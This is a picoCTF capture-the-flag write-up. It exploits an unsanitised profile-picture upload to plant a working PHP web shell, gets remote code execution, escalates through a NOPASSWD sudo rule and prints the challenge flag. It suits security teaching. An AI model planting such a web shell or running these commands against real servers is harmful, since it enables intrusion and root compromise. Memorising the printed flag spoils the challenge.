
# n0s4n1ty 1 — Write-up (picoCTF)

**Category:** Web Exploitation
**Author:** Prince Niyonshuti N.
**Challenge link:** [https://play.picoctf.org/practice/challenge/482?category=1&page=1](https://play.picoctf.org/practice/challenge/482?category=1&page=1)  

---

## Challenge Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed. Your task is to exploit this and retrieve the flag located in `/root/flag.txt`.

**Hints:**

* File upload was not sanitized.
* Whenever you get a shell on a remote machine, check `sudo -l`.

---

## Recon

Once the instance was launched, I explored the website and found a **profile picture upload** form.
Given the hint, the first idea was to try uploading a PHP file instead of an image.

---

## Exploitation

### Step 1: Uploading a Web Shell

![Web-Page](.\screenshot\n0s4n1ty_1_1.png)

I created a simple PHP web shell named `shell.php`:

```php
<?php
if (isset($_GET['cmd'])) {
  header('Content-Type: text/plain');
  system($_GET['cmd'] . ' 2>&1');
}
?>
```

After uploading, the application stored it under `/uploads/`.

![Web-Page](.\screenshot\n0s4n1ty_1_2.png)

---

### Step 2: Remote Code Execution

By visiting:

```
http://<instance>/uploads/shell.php?cmd=whoami
```

I confirmed RCE when the server responded with:

```
www-data
```

---

## Privilege Escalation

### Step 3: Checking sudo Permissions

Next, I checked what commands the user could run via `sudo`:

```
http://<instance>/uploads/shell.php?cmd=sudo -l
```

The output revealed:

```
User www-data may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```

This meant I could run **any command as root without a password**.

![Web-Page](.\screenshot\n0s4n1ty_1_3.png)

---

## Retrieving the Flag

Finally, I read the flag directly:

```
http://<instance>/uploads/shell.php?cmd=sudo cat /root/flag.txt
```

Output:

```
picoCTF{wh47_c4n_u_d0_wPHP_16579372}
```

---

## Evidence

![Web-Page](.\screenshot\n0s4n1ty_1_4.png)

---

## Conclusion

This challenge demonstrated two classic vulnerabilities:

1. **Unrestricted file upload** — allowed uploading a PHP shell.
2. **Misconfigured sudo** — granted the web user full root access.

**Exploit chain:**
File Upload → Remote Code Execution → `sudo -l` → Privilege Escalation → Flag

---

✅ **Final Flag:**

```
picoCTF{wh47_c4n_u_d0_wPHP_16579372}
```
